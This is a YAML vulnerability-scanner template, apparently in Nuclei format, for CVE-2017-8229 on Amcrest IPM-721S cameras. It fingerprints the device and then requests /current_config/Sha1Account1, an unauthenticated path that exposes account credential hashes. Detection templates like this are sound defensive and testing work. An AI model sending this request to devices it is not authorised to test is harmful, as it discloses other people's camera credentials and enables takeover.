id: yaml-poc-amcrest-ipm-721s_firmware-other-CVE-2017-8229
info:
  name: Yaml Poc Amcrest Ipm 721S_Firmware Other Cve 2017 8229
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-amcrest-ipm-721s_firmware-other-CVE-2017-8229'
  tags: cve
  classification:
    cve-id: CVE-2017-8229
  reference:
  - http://packetstormsecurity.com/files/153224/Amcrest-IPM-721S-Credential-Disclosure-Privilege-Escalation.html
  - https://github.com/ethanhunnt/IoT_vulnerabilities/blob/master/Amcrest_sec_issues.pdf
  - https://nvd.nist.gov/vuln/detail/CVE-2017-8229
  - https://seclists.org/bugtraq/2019/Jun/8
http:
- method: GET
  path:
  - /
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - Amcrest Technologies
- method: GET
  path:
  - /current_config/Sha1Account1
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - ','
